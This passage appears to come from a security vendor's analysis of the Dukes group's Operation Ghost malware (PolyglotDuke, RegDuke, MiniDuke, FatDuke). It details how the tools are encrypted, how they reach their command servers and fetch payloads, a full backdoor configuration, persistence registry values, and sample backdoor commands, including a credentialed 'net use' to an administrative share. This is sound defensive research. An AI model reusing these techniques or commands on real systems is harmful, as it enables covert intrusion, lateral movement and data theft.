@@ -1,0 +1,800 @@
+4. TECHNICAL ANALYSIS
+In this part, we present the technical analyses of the different malware stages used in Operation Ghost.
+4.1 Compromise vector
+Despite having analyzed the Dukes activities in several different organizations, we were not able to find the
+initial compromise vector. The group is known for sending well-crafted malicious emails, but we did not find
+any such samples.
+It should also be noted that two of the three targeted organizations we identified had previously been
+compromised by the Dukes, mainly in 2015. As such, it is highly possible that the attackers kept control over
+the compromised networks during this whole period. We observed them pivoting in an already-compromised
+network using lateral movement tools like PsExec and stolen administrative credentials. As such, from only a
+few compromised machines, they are able to expand their operations.
+4.2 PolyglotDuke: the first stage
+PolyglotDuke is a downloader that is used to download and drop the MiniDuke backdoor. As mentioned
+in section 3.2 and shown in Figure 6, this downloader shares several similarities with other samples from
+previous Dukes campaigns such as the use of Twitter to retrieve and decode its C&C server address, as well
+as a custom string encryption implementation. Both 32- and 64-bit versions of PolyglotDuke were observed
+and have similar behavior. We dubbed this downloader PolyglotDuke in reference to its use of charsets from
+different languages to encode the C&C addresses.
+14 Operation Ghost The Dukes aren’t back – they never left
+Dropper
+PolyglotDuke’s dropper embeds an encrypted PolyglotDuke within a resource type named ~~GIF~~ with the
+ID 129. The resource is encrypted with the following algorithm, using the string ~~GIF89~~ from the resource
+(which is the 5 first magic bytes of the start of the GIF header) as the key:
+```
+    clearText[i] = (i / 5) ^ cypherText[i] ^ aGif89[i % 5]
+```
+After decryption, the DLL is written to the current working directory and executed using ~~rundll32.exe~~ .
+The custom string encryption algorithm used by the PolyglotDuke dropper is identical to the one used by
+PolyglotDuke, as well as other samples from previous Dukes campaigns, and is depicted in Figure 7.
+As mentioned in section 3.2, it’s worth noting that this dropper shares a great deal of functionality with
+OnionDuke, such as the use of a GIF resource, the use of the same algorithm with the string ~~GIF89~~ as key to
+decrypt the resource, and the use of the same custom encryption algorithm to encrypt the strings.
+C&C server address retrieval from public webpages
+Strings from PolyglotDuke are decrypted using two different algorithms. The string is either RC4 encrypted
+using the ~~CryptDecrypt~~ API where the key is derived from the system directory path with the drive letter
+removed, or using the custom encryption algorithm shown in Figure 6. An IDA Python script to decrypt
+these strings is provided in our GitHub repository .
+The C&C server address is retrieved and decoded from various public webpages such as Imgur, ImgBB or
+Fotolog posts, tweets, Reddit comments, Evernote public notes, etc. Several encrypted public webpage URLs
+are hardcoded in each sample (from three to six URLs in a single sample) and it will iterate over the hardcoded list of C&C server addresses until it is able to decode a valid C&C URL successfully. An example
+of a public webpage containing an encoded C&C URL is shown Figure 10.
+Figure 10 // Example of a public post containing an encoded C&C URL
+After retrieving the content of one of these webpages, PolyglotDuke parses it to find two delimiter strings
+and extracts the content between them. The extracted UTF-8 string uses a particular character set within a
+Unicode block such as Katakana [22], Cherokee [23] or Kangxi radicals [24] . Any given sample can only
+decode a C&C URL encoded in one of those charsets. The string is first converted to UTF-16, only the last
+byte of each codepoint is kept, then a custom mapping is used to transpose this to printable ASCII. The order
+of the characters of the resulting string is then reversed, resulting in the C&C URL. A script to decrypt the
+C&C URL, regardless of the Unicode range used, is provided on our GitHub repository .
+15 Operation Ghost The Dukes aren’t back – they never left
+PolyglotDuke, a multilingual downloader
+Katakana is a Japanese syllabary (part of the Japanese writing system), while Cherokee syllabary is
+used to write Cherokee (which is a Haudenosaunee language), and Kangxi radicals are components of
+Chinese characters. The use of these character sets from different languages is the reason we named
+this downloader PolyglotDuke:
+Katakana
+ァアィイゥウェエォオカガキギクグケゲコゴサザシジスズセゼソゾタダチヂッツヅテデトドナニヌネノハバパヒビピ
+フブプヘベペホボポマミムメモャヤュユョヨラリルレロヮワヰヱヲンヴヵヶヷヸヹヺ
+Cherokee
+ᎠᎡᎢᎣᎤᎥᎦᎧᎨᎩᎪᎫᎬᎭᎮᎯᎰᎱᎲᎳᎴᎵᎶᎷᎸᎹᎺᎻᎼᎽᎾᎿᏀᏁᏂᏃᏄᏅᏆᏇᏈᏉᏊᏋᏌᏍᏎᏏᏐᏑᏒᏓᏔᏕᏖᏗᏘᏙᏚᏛᏜᏝᏞᏟᏠᏡᏢᏣᏤᏥ
+ᏦᏧᏨᏩᏪᏫᏬᏭᏮᏯᏰᏱᏲᏳᏴ
+Kangxi radicals
+⽶⽷⽸⽹⽺⽻⽼⽽⽾⽿⾀⾁⾂⾃⾄⾅⾆⾇⾈⾉⾊⾋⾌⾍⾎⾏⾐⾑⾒⾓⾔⾕⾖⾗⾘⾙⾚⾛⾜⾝⾞⾟⾠⾡⾢⾣⾤
+⾥⾦⾧⾨⾩⾪⾫⾬⾭⾮⾯⾰⾱⾲⾳⾴⾵⾶⾷⾸⾹⾺⾻⾼⾽⾾⾿⿀⿁⿂⿃⿄⿅⿆⿇⿈⿉⿊⿋⿌⿍⿎⿏⿐⿑⿒⿓
+⿔⿕
+Interestingly, the text from the delimiter strings usually makes sense in the context of the fake post.
+The decoded C&C URL points to a PHP script with which the downloader communicates using GET requests,
+as described in the next section.
+Communication with the C&C server
+Once the C&C server URL is decoded, the compromised computer sends HTTP GET requests with arguments
+using the following format:
+```
+    GET example.com/name.
+php?[random_param1]=[random_string1]&[random_param2]=[random_string2]
+
+```
+Only the argument values are relevant here as the argument names are selected randomly from a hardcoded list. The list of argument names used is shown in Table 1. This makes the communication between
+PolyglotDuke and the C&C server difficult to identify because there are no obvious patterns. Additionally, the
+~~User-Agent~~ header used to perform the GET requests is a common one:
+```
+    Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2;
+SV1; .NET CLR 3.3.69573; WOW64; en-US)
+
+```
+~~Table 1~~ ~~List of parameters used to generate GET request to the C&C server~~
+List of hardcoded argument names
+```
+         action Arg campaign_id data
+     extra extra_1 Format id
+
+     img_id Item itemId item_id
+
+     K L mod_id mode
+
+     num Number Oldid option
+
+```
+page Pf Pflo placement
+```
+         ref S Show state
+     tag Term Title v
+
+     var View
+
+```
+16 Operation Ghost The Dukes aren’t back – they never left
+The GET argument values are randomly generated but the first random string in each request should comply
+with a constraint based on a specific integer (see below). A string will be randomly regenerated until one
+complies with the constraints. The digits from the string representation of the MD5 hash of the randomly
+generated string are summed, and then modulo 5 of this value must match a specific integer.
+The communication with the C&C server to retrieve a payload follows this sequence:
+   - First the communication with the C&C server is checked. The sum of the digits of the MD5 hash
+
+of the first argument modulo 5 should be equal to 4. The response of the C&C server is matched
+with the second random string as it will echo back this string in case of successful communication.
+   - If the communication with the C&C server is successful, a custom hash from the concatenation
+
+of the username and the volume serial number of the disk of the current directory is generated
+and sent twice. The modulo 5 value of the MD5 hash of the first parameters of these requests should
+be 0 and 2 respectively.
+   - In the response to the second request, search for ~~`<img src=”`~~ and the next ~~`“>`~~ strings in the last
+
+response and extract the image filename between them, if present. Figure 11 shows a C&C server
+response at the identification step, with a path to an image ~~(~~ ~~cuteanimals12.jpg~~ in this case).
+   - If a filename was extracted in the preceding step, the file is retrieved into the directory whose
+
+name is the unique ID sent twice at the registration step:
+```
+      GET example.com//cuteanimals12.jpg
+```
+Figure 11 // C&C response with a path to an image to download
+This sequence continues until a path to a file is provided between the ~~<img src=” and “>~~ strings and the
+file downloaded. The communication steps are summarized in Figure 12.
+|PolyglotDukeTwitter, ImgurReddit C&C sRetrieve C&C addressCommunication checkEchoIdentificationPath to fileGet imgImg|Col2|Col3|
+|---|---|---|
+|Twitter, ImgurReddit~~Communication check~~~~Echo~~~~Identiﬁcation~~~~Path to ﬁle~~~~Img~~~~Get img~~C&C sPolyglotDuke~~Retrieve C&C address~~|~~Identiﬁcation~~|~~Identiﬁcation~~|
+|Twitter, ImgurReddit~~Communication check~~~~Echo~~~~Identiﬁcation~~~~Path to ﬁle~~~~Img~~~~Get img~~C&C sPolyglotDuke~~Retrieve C&C address~~|~~Identiﬁcation~~|~~Path to ﬁle~~|
+|Twitter, ImgurReddit~~Communication check~~~~Echo~~~~Identiﬁcation~~~~Path to ﬁle~~~~Img~~~~Get img~~C&C sPolyglotDuke~~Retrieve C&C address~~|~~Get img~~|~~Get img~~|
+|Twitter, ImgurReddit~~Communication check~~~~Echo~~~~Identiﬁcation~~~~Path to ﬁle~~~~Img~~~~Get img~~C&C sPolyglotDuke~~Retrieve C&C address~~|~~Get img~~|~~Img~~|
+|Twitter, ImgurReddit~~Communication check~~~~Echo~~~~Identiﬁcation~~~~Path to ﬁle~~~~Img~~~~Get img~~C&C sPolyglotDuke~~Retrieve C&C address~~|||
+|Twitter, ImgurReddit~~Communication check~~~~Echo~~~~Identiﬁcation~~~~Path to ﬁle~~~~Img~~~~Get img~~C&C sPolyglotDuke~~Retrieve C&C address~~|||
+Time
+Figure 12 // Communication sequence with the C&C server
+17 Operation Ghost The Dukes aren’t back – they never left
+Interestingly, the root URLs of the C&C server used by PolyglotDuke redirect to domains with similar names
+hosting legitimate websites. This technique is probably used in order to avoid suspicion when investigating
+the traffic with the C&C server. For one of the C&C servers, the attackers forgot to add a TLD to the redirected domain. Examples of redirection are shown in Table 2.
+~~Table 2~~ ~~Example of redirection from the C&C servers’ root URLs~~
+C&C server domain name Redirection target
+rulourialuminiu.co[.]uk rulourialuminiu.ro
+powerpolymerindustry[.]com powerpolymer.net
+ceycarb[.]com ceycarb (invalid, missing TLD)
+Payload decryption and execution
+A data blob containing encrypted data is appended to the end the downloaded file: this technique allows
+data to be easily included in a JPEG or PNG image download in a way that means the image remains valid.
+We couldn’t retrieve any of the files downloaded by PolyglotDuke to confirm this hypothesis but the way
+the encrypted blob is added to such files in addition to their extension being ~~.jpg~~ or ~~.png~~ lead us to think
+that they were valid images used to look like legitimate traffic.
+To extract the payload from the file downloaded from the C&C server, PolyglotDuke will first decrypt
+the last eight bytes with RC4 using the same key as the one used for strings decryption. The first four
+decrypted bytes correspond the offset to the embedded blob relative to the end of the file and the last
+four bytes provide a value used as integrity check; that value is the same as the first four bytes
+at the beginning of the blob.
+The structure of the file is described in Figure 13.
+DWORD
+Offset
+DWORD DWORD Size 0x100 DWORD
+offset
+Figure 13 // Embedded blob format
+0x1BD75010
+After obtaining the offset to the embedded blob and checking the integrity value, the size of the RC4-encrypted blob is retrieved from immediately afterward. Then, next to the encrypted blob, we find the signed
+SHA-1 hash of the blob. Before decrypting the blob, the hash signature is checked against an RC4-encoded
+public key hardcoded in the binary. The signature verification procedure is shown in Figure 14, while
+the public key used to check the hash signature is shown in Figure 15.
+18 Operation Ghost The Dukes aren’t back – they never left
+Figure 14 // Decompiled hash signature verification procedure
+Figure 15 // Public key used to verify the hash signature
+This technique ensures that only a payload signed by the operators could be executed on the victim’s
+machine, since the private key used to sign the hash is needed to generate a valid signature.
+After having successfully checked the hash signature of the encrypted blob, it is decrypted using the same
+key used for the RC4-encrypted strings. The format of the decrypted blob is shown in Figure 16.
+DWORD
+PE Size DWORD Filename size
+size
+1
+|Col1|Col2|Col3|
+|---|---|---|
+|Exectype|Exectype|Exectype|
+||||
+1 2
+Figure 16 // Encrypted blob format after decryption
+Notice that the same delimiter value is used and checked at various positions of the blob (in the example
+in Figure 16 it is 0x1BD75010). Two of the bytes between the first two delimiters define the action
+to be taken with the decrypted blob.
+The value immediately following the second delimiter is the size of the data, being either a PE or an encrypted
+configuration, followed by the data itself followed by a third delimiter, the size of the subsequent filename,
+and finally the filename itself. The correct extension ( ~~.dll~~ or ~~.exe~~ ) will be appended to the filename
+of the PE to be written, depending on the executable type. The list of valid combinations and their respective
+behaviors is shown on Table 3.
+19 Operation Ghost The Dukes aren’t back – they never left
+~~Table 3~~ ~~List of execution type combination and their corresponding behavior~~
+exec type 1 exec type 2 behavior
+0 2 write the executable to disk and launch it using ~~CreateProcess~~
+1 4 write the DLL to disk and launch it using ~~rundll32.exe~~
+2 3 write the DLL to disk and load it using ~~LoadLibraryW~~
+write the encrypted JSON config to the registry, updating the list of public pages to
+3 1
+parse for encoded C&C addresses
+4.3 RegDuke: a first-stage implant
+RegDuke is a first-stage implant that is apparently used only when attackers lose control of the other
+implants on the same machine. Its purpose is to stay undetected as long as possible to help make sure
+the operators never lose complete control of any compromised machine.
+It is composed of a loader and a payload, the latter being stored encrypted on the disk. Both components
+are written in .NET. RegDuke persists by using a WMI consumer named ~~MicrosoftOffceUpdates~~ i ~~.~~
+It is launched every time a process named ~~WINWORD.EXE~~ is started.
+Our analysis is based on the sample with SHA-1 ~~0A5A7DD4AD0F2E50F3577F8D43A4C55DDC1D80CF~~ .
+The loader
+Between August 2017 and June 2019, we have seen four different main versions of the loader. The first
+version was not obfuscated and had the encryption key hardcoded in the code. Later versions read the
+encryption key from the Windows registry and use different types of obfuscation such as control-flow
+flattening or directly using .NET Reactor, a commercial obfuscator. Figure 17 is a sample of RegDuke
+obfuscated with .NET Reactor.
+i
+i
+Figure 17 // Obfuscated RegDuke sample
+The flow of the loader is simple. It reads the encrypted file at either a hardcoded path or at a value extracted
+from the Windows registry, as shown in Figure 18.
+i
+i
+Figure 18 // RegDuke. The path, password and salt are hardcoded in this example.
+20 Operation Ghost The Dukes aren’t back – they never left
+Then, it decrypts it using a password and a salt either hardcoded in the loader or stored in the Windows
+registry. The encryption key and the initialization vector are derived from the password and the salt using
+the technique described in RFC 2898, also known as PBKDF2, as shown in Figure 19.
+Figure 19 // Decryption of RegDuke payload
+In all the samples we have seen, they use only the three different registry keys listed in Table 4.
+It is interesting to note that attackers seem to have put some effort at selecting registry keys and values that
+might look legitimate.
+~~Table 4~~ ~~RegDuke Windows registry keys~~
+Value containing
+Registry Key the directory of
+the payload
+Value containing
+the filename of
+the payload
+Value containing
+the password and
+the salt
+HKEY_LOCAL_MACHINE\SOFTWARE\Intel\
+PathCPA CPAmodule Init
+MediaSDK\Dispatch\0102
+HKEY_LOCAL_MACHINE\SOFTWARE\Intel\
+RootPath APIModule Stack
+MediaSDK\Dispatch\hw64-s1-1
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ MSBuildOverrideDefaultLibs BinaryCache
+MSBuild\4.0 TasksPath
+Finally, the decrypted Windows Executable is loaded using the ~~Assembly.Load~~ method. We only found
+one payload, but we cannot be certain that others are not deployed in the wild.
+The payload: a fileless, Dropbox-controlled backdoor
+The payload is a backdoor that resides in memory only, and that uses Dropbox as its C&C server.
+Its configuration is hardcoded in an internal class, shown in Figure 20. Our analysis is based on the sample
+with SHA-1 ~~5905C55189C683BC37258AEC28E916C41948CD1C~~ .
+Figure 20 // Dropbox backdoor configuration (redacted)
+We have seen the following ~~clientId~~ values being used: ~~collection_3~~, ~~collection_4~~ ~~,~~ ~~collection_6~~ ~~,~~
+~~collection_7~~ ~~,~~ ~~collection_8~~ and ~~collection_99~~ ~~.~~ However, other than ~~collection_4~~ ~~,~~ we were not
+able to determine the targets for these collections.
+21 Operation Ghost The Dukes aren’t back – they never left
+The backdoor regularly lists the Dropbox directory corresponding to its ~~clientId~~ and downloads PNG files
+from it. The downloaded PNG files are valid pictures, as you can see in Figure 21.
+Figure 21 // Example of two pictures downloaded from the Dropbox directory
+However, the attackers have used steganography to hide data in the pictures. In Figure 22, you can see
+the code looping over all the pixels of the image and extracting data from them.
+Figure 22 // Loop extracting a payload from the pixels of a downloaded picture
+Each pixel is encoded into 24 bits: 8 for red, 8 for green and 8 for blue. The developers use a technique
+called “Least Significant Bit” to store 8 bits of data in each pixel, as shown in Figure 23. This technique
+has been used previously by other malware such as Gozi [25] . They extract two bits from the red value,
+three from the green and three from the blue.
+Red Green
+Blue
+Figure 23 // The least significant bits of each color of each pixel are extracted to recover the hidden data
+22 Operation Ghost The Dukes aren’t back – they never left
+The steganographically altered image has almost no visible difference from the original image because
+the two or three least significant bits have a very limited impact on the color. For the green and blue
+components of each pixel a maximum of 7/256, and for the red component 3/256 of a fully saturated pixel
+variation will occur. Figure 24 shows a blue of value 255 (on the left) and the maximum deviation from that
+in just the blue spectrum with a value of 248 (on the right). There is apparently no difference but, by doing
+that on every pixel of the image, allows the attacker to store a backdoor in a still valid PNG image.
+255 248
+Figure 24 // Comparison between a blue of value 255 and a blue of value 248
+Finally, it decrypts the extracted bytes using the AES key hardcoded in the config. The decrypted data can be:
+   - a Windows executable
+
+
+   - a Windows DLL
+
+
+   - a PowerShell script
+
+We have seen the following executables being dropped by this Dropbox backdoor:
+   - Several MiniDuke backdoors (see _section 4.4_ )
+
+
+   - Process Explorer, a utility that is part of the _[SysInternals suite](https://docs.microsoft.com/en-us/sysinternals/)_
+
+4.4 MiniDuke backdoor: the second stage
+As highlighted in section 3.2, the most recent versions of the MiniDuke backdoor have a lot of code similarities
+with earlier versions, such as the sample with SHA-1 of ~~86EC70C27E5346700714DBAE2F10E168A08210E4~~,
+described by Kaspersky researchers in 2014 [21] . Our analysis is based on the sample with
+SHA-1 ~~B05CABA461000C6EBD8B237F318577E9BCCD6047~~ ~~,~~ compiled on August 17, 2018.
+MiniDuke acts as a second-stage backdoor, which is dropped by one of the two first-stage components
+described in the sections above.
+The most recent samples we are aware of were compiled in June 2019 and show no major changes, except
+the C&C domain and the use of an invalid (likely transplanted) digital signature, as shown in Figure 25.
+This might be an attempt to bypass some security products.
+Figure 25 // Invalid digital signature added to the backdoor
+23 Operation Ghost The Dukes aren’t back – they never left
+The backdoor is still written in pure x86 assembly but its size increased a lot – from 20 KB to 200+ KB.
+This is due to the addition of obfuscation, mainly control-flow flattening [26], as shown in Figure 26.
+This is a common obfuscation technique that makes it difficult to read the code because every function
+is split in a switch/case inside a loop.
+Figure 26 // Control flow flattening used to obfuscate the MiniDuke backdoor
+Some of the Windows API functions are resolved dynamically. The backdoor uses a simple hash function
+to obfuscate the name of the function it tries to resolve.
+The network communication is relatively simple. It can use the ~~GET~~ ~~,~~ ~~POST~~ and ~~PUT~~ HTTP methods to contact
+the hardcoded C&C server.
+In order to blend into the legitimate traffic, the data are prepended with a JPEG header. The resulting images
+are not valid, but it is very unlikely that anybody will check the validity of all pictures in the network traffic.
+Figure 27 is an example of a POST request to the C&C server. As the server was down at the time of capture,
+we were not able to receive a reply, but we believe the reply also contains a JPEG header, as the malware
+ignores the first bytes of the reply.
+Figure 27 // Post request to the C&C server that looks like a regular jpeg file upload
+In addition to the HTTP protocol, the malware is able to send and receive data over a named pipe. This
+feature typically allows it to reach machines on the local network that don’t have internet access. One
+compromised machine, with internet access, will forward commands to other compromised machines
+through the named pipe.
+A similar feature to the named pipe is the HTTP proxy. The malware will listen on a first socket, either
+on the default port ~~8080~~ or on a port specified by the operators. It will also open a second socket with
+the C&C server. It waits for connections on the first socket and when one is established, it proxies data
+between the two sockets. Thus, a machine without internet access, or with a firewall that blocks connections to the attackers’ domain, might still be able to reach the C&C through the proxy machine.
+24 Operation Ghost The Dukes aren’t back – they never left
+Finally, this malware implements thirty-eight different backdoor functions such as:
+   - Uploading or downloading files
+
+
+   - Creating processes
+
+
+   - Getting system information (hostname, ID, pipename, HTTP method)
+
+
+   - Getting the list of local drives and their type ~~(~~ ~~`unk`~~ ~~,~~ ~~`nrt`~~ ~~,~~ ~~`rmv`~~ ~~,~~ ~~fx~~ i ~~,~~ ~~`net`~~ ~~,~~ ~~`cdr`~~ ~~,~~ ~~`ram`~~, ~~`und`~~ )
+
+
+   - Reading and writing in the named pipe
+
+
+   - Starting and stopping the proxy feature
+
+4.5 FatDuke: the third stage
+FatDuke is the current flagship backdoor of the group and is only deployed on the most interesting
+machines. It is generally dropped by the MiniDuke backdoor, but we also have seen the operators dropping
+FatDuke using lateral movement tools such as PsExec.
+The operators regularly repack this malware in order to evade detections. The most recent sample
+of FatDuke we have seen was compiled on May 24, 2019.
+We have seen them trying to regain control of a machine multiple times in a few days, each time with
+a different sample. Their packer, described in a later section, adds a lot of code, leading to large binaries.
+While the effective code should not be larger than 1MB, we have seen one sample weighing in at 13MB,
+hence our name for this backdoor component: FatDuke.
+In this section, we will use the sample with SHA-1 ~~DB19171B239EF6DE8E83B2926EADC652E74A5AFA~~
+for our analysis.
+Installation and persistence
+During our investigation, we were not able to find a dropper for FatDuke. We believe the operators simply
+install the backdoor and establish persistence using the standard commands of an earlier stage backdoor.
+We also noted that FatDuke generally replaced the second-stage binary, reusing the persistence
+mechanism already in place.
+The persistence we have seen is very standard. They use the registry key ~~HKLM\SOFTWARE\Microsoft\~~
+~~Windows\CurrentVersion\Run~~ and creatd a new value named ~~Canon Gear~~ and value ~~C:\Program~~
+~~Files\Canon\Network ScanGear\Canocpc.exe~~ ~~.~~ This launches the backdoor each time a user logs in.
+Configuration
+FatDuke has a hardcoded configuration embedded in the executable’s resources, as shown in Figure 28.
+i
+i
+Figure 28 // FatDuke configuration data in the PE resources
+25 Operation Ghost The Dukes aren’t back – they never left
+The configuration data is a JSON object encoded in base64. Once decoded, it reveals much interesting
+information, as shown in Figure 29.
+{
+"config_id": "145",
+"encoding_mode": "Base64",
+"encryption_mode": "Aes256",
+"key": "62DA45930238A4A1149E76658A35C4A70CE7E0CDF7529C96499FB5F27AA647B3",
+"pivoting_ip": "",
+"pivoting_pipe": "lippstdt",
+"pivoting_login": "Administrator",
+"pivoting_password": "",
+"server_address": "https://ministernetwork[.]org:443/Main/",
+"ignore_certificate_errors": "0",
+"connection_types": "WinInet,WinHttp,UrlMon",
+"data_container": "Cookie",
+"rsa_public_key": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0NCk1JSUJJakFOQmdrcWhraUc5dz
+       BCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBcWZBWHVlRTdiK2pUUFhWb3MxVSsNCnRkcWV5WlR2dFNWYXRvZkt
+       1QWZUNm5wVmh3cHBieFRDcjdSN1Y2VXdwK2tPK1pTbWRWTTZ4b3VzOTAyTDVIV3UNCldXK1dOemsraDVJUzFP
+       dWdkeUJXQWs4bDRmWVRoMVBNbXgwTzQvZU9JY0g4c1NUNXZPOTB3SEY0T3pXQ1I4b3gNCkxqVGlkTTdpVXQ5Y
+       kptVjRkNDZVa2tpL3ZDYXZFU0p5b0l2eU9WS2M0ZjNRczQ2TW1uSjRnd1RoaE4rQkt2dmgNCnphbXJOZ3kzNk
+       9QY0IxOFRweGd3OW8vVmpMbTJ2RTB2c3dzM3hqOXlGTERTVFplRUFBY0V6c1NvckRQOFdOWm0NCktyMXVNUFh
+       vL3k2by9VOUptM3VPdUFFdG50cEpRQW5SZmFpZGZpbHBVUHF6OXZxWGpiOCtJSXVtWVQvRUVwcmMNCkd3SURB
+UUFCDQotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0NCg==",
+"request_min_timeout_s": "1",
+"request_max_timeout_s": "60",
+"php_aliases": "about.php,list.php,contacts.php,people.php,forum.php,index.php,
+welcome.php",
+"cookies": "param,location,id_cookie,info,session_id",
+"service_cookie_1": "GMAIL_RTT",
+"service_cookie_2": "SAPISID",
+"service_cookie_3": "APISID",
+"activity_scheduler": "Mon,Tue,Wed,Thu,Fri;0:00-23:59",
+```
+         "grab_ua_by_probing": "0"
+       }
+```
+Figure 29 // FatDuke configuration example
+Included in the information contained in the config, we can see:
+   - The AES key used to encrypt/decrypt the network traffic
+
+
+   - The pipe name and the credentials used to contact another machine on the local network
+
+
+   - The C&C URL
+
+
+   - The time of day when the backdoor is enabled for attacker access
+
+
+   - Cookies that the malware can fetch in the browser’s cookie directory. They are related to cookies used
+
+by Google services such as YouTube or Gmail
+The operator has the possibility to fetch the configuration from the computer along with usual computer
+information like username, Windows version, computer name, build, etc.
+Finally, it does not seem possible to update this configuration without dropping a new version
+of the malware.
+Backdoor and network
+FatDuke can be controlled remotely by the attackers using a custom C&C protocol over HTTP or using
+named pipes on the local network.
+HTTP communications and backdoor commands
+In order to blend into the network traffic, FatDuke tries to mimic the user’s traffic by using the same
+User-Agent as the browser installed on the system. It implements two different techniques to gather this
+value.
+26 Operation Ghost The Dukes aren’t back – they never left
+First, it can probe the User-Agent by making an HTTP request on a socket it has just created.
+
+
+It creates a socket listening on localhost:80
+
+
+It accepts any connection
+
+
+It calls ~~ShellExecuteW~~ with ~~open~~ and ~~http://localhost:~~ as argument. This will open the default
+
+
+browser on the URL localhost.
+
+The socket replies with a hardcoded HTTP reply:
+
+```
+       HTTP/1.1 200 OK
+       Server: Apache/2.2.14 (Win32)
+       Content-Type: text/html
+       Connection: close
+   <html><script>window.close();</script></html>
+
+```
+This simple JavaScript code will directly close the browser. The window pops up only for a fraction
+of second but the user also loses focus of the currently active window.
+
+In order to extract the User-Agent, FatDuke parses the HTTP request sent by the browser to its socket.
+
+If the previous method did not work, it can check the default browser in the registry key ~~HKCU\Software\~~
+~~Classes\http\shell\open\comman~~ ~~d~~ . It then selects one of the hardcoded User-Agent strings
+accordingly, as shown in Table 5.
+~~Table 5~~ ~~Hardcoded User-Agent~~
+Default Browser Selected User-Agent
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0
+Chrome
+Safari/537.36
+Firefox Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Internet Explorer Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
+Opera
+Chrome/37.0.2062.35 Safari/537.36 OPR/24.0.1558.21
+Mozilla/5.0 (Windows; Windows NT 6.1) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7
+Safari
+Safari/534.57.2
+Next, FatDuke contacts the C&C server, specified in the config, and uses one of the PHP scripts specified in
+the ~~php_aliases~~ field of the config. It is interesting to note that these filenames are related to the theme
+of the C&C server domain. For example, they registered the domain ~~westmedicalgroup[.]net~~, and the
+aliases list contains filenames such as ~~doctors.php~~ or ~~diagnostics.php~~ ~~.~~
+Figure 30 is a summary of the C&C protocol.
+HTML page
+> [_]
+Malicious
+action
+Backdoor
+command in JSON
+Figure 30 // FatDuke C&C protocol
+Execute Decode
+the command and decrypt
+Image URL
+Image URL
+27 Operation Ghost The Dukes aren’t back – they never left
+The requests sent to the C&C server are crafted to look like typical GET requests and once again
+are related to the script name. For example, the request below uses parameters that you might expect
+to find on a forum’s website.
+```
+    /homepage/forum.php?newsid=&article=&user=
+e40a4bc603a74403979716c932f0523a&revision=3&fromcache=0
+
+```
+However, while some fields are randomly generated strings, ~~article~~ and ~~user~~ could be used
+by the operator to pinpoint the victim. The first keyword, ~~article~~, is an identifier – a SHA-256 hash
+of the volume identifier concatenated with MAC addresses found on the target computer. The other
+keyword, ~~user~~, probably flags the general configuration that comes with the malware. This value
+is located in the PE resource section, right before the encoded configuration mentioned in section 4.5 .
+The reply is an HTML page, with the HTML content copied from a legitimate website such as the BBC.
+However, if the C&C server wants to send a command to the malware, it will add an additional
+HTML ~~img~~ tag to the page, as shown in Figure 31.
+Figure 31 // Additional image tag sent by FatDuke C&C
+Once it receives this HTML page, the malware uses the two following regexes:
+   - ~~`<img id=”id[0-9]+” src=”([^ “]+)” class=”image-replace”[^>]*>`~~
+
+
+   - ~~`<img id=”idd[0-9]+” src=”([^ “]+)” class=”image-replace”[^>]*>`~~
+
+These regexes extract the ~~src~~ attribute value – the URI of the image. If it finds an image, the malware will
+make another GET request to ~~http(s)://<C&C>/<directory>/<php_script.php>?imageid=<src~~
+~~value>~~ . In our example, it will make a request to ~~http://<C&C>/about/bottom.php?imageid=32d7~~
+~~bcf505ca1af4a38762ff650968ac9cab2ce305cdbf8331d30b.png~~ .
+This will return a file, such as that shown in Figure 32. These files masquerade as PNG images
+in the GET request, but are not valid images. They contain a header of 0x37 bytes, matching one hardcoded
+in the malware, and a chunk of encrypted data that is base64 encoded. To further the PNG subterfuge,
+the header contains an incomplete, misplaced and corrupted PNG header, which may be sufficient to avert
+concern under cursory examination.
+Figure 32 // C&C response including most of a valid PNG header and an encrypted command for FatDuke
+28 Operation Ghost The Dukes aren’t back – they never left
+The malware then decrypts this data using AES-256 in ECB mode, with the key hardcoded in the config.
+The result is a command in JSON. Figure 33 shows six real command examples.
+{"commandBody":"14 C:\\Users\\<redacted>\\AppData\\
+Local","size":0,"iscmd":true}
+{"commandBody":"5 -parsing=raw -type=exe net.
+             exe use \\\\WORKPC\\IPC$ \\"<redacted password>\\" /
+USER:Administrator","size":0,"iscmd":true}
+{"commandBody":"5 -parsing=raw -type=exe schtasks.exe /Query /FO
+TABLE","size":0,"iscmd":true}
+{"commandBody":"14 C:\Users\Administrator","size":0,"iscmd":true}
+{"commandBody":"14 \\\\<redacted>\\C$\\Users\\User\\
+Desktop","size":0,"iscmd":true}
+{"commandBody":"7","size":0,"iscmd":true}
+Figure 33 // Example of commands sent to FatDuke
+These JSON objects contain a command identifier and the command arguments. Table 6 shows
+the commands implemented by FatDuke.
+~~Table 6~~ ~~FatDuke backdoor commands~~
+ID Description ID Description
+0 Read or write an environment variable 17 Copy a file or a directory
+1 Load a DLL 18 Remove a directory
+2 Unload a DLL 19 Remove a file
+3 Execute rundll32 20 Compute the MD5 of a file
+Execute a command, a wscript, a PowerShell
+4 21 ~~cat~~ a file
+command or create a process
+Execute a command, a wscript, a PowerShell
+5 command or create a process, using a pipe to get 22 Exfiltrate a file
+the result
+6 Kill a process 23 Write a file
+7 Kill itself 24 Write random data to a file (secure deletion)
+Uninstall (secure delete its DLL and exit the
+8 25 System information
+process)
+9 Turn on or off the random interval 26 Date
+10 Set User-Agent to default value 27 List running processes
+Return the list of disks with their type and
+11 Enable debug log 28
+available space
+12 Return the working directory 29 Return malware information
+13 Change the working directory 30 Listen to a pipe
+14 List directory 31 Stop listening to a pipe
+15 Create directory 32 List open pipes
+16 Move a file or a directory
+The C&C servers used for FatDuke do not seem to be compromised websites. In order to look legitimate,
+they register variants of existing domains and redirect the homepage of their C&C server to the homepage
+of the real domain. As mentioned before, this technique is also used for PolyglotDuke C&C servers.
